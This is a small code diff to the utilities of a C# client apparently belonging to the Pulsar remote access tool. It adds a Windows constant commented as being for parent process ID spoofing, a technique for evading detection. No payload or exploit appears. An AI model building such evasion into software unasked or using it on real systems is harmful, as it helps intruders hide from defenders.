@@ -68,6 +68,9 @@ namespace Pulsar.Client.Utilities
         // Thread attribute
         public static readonly IntPtr PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = (IntPtr)0x20007;
 
+        // ppid spoofing
+        public const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
+
         // Structures
         [StructLayout(LayoutKind.Sequential)]
         public struct PROCESS_INFORMATION
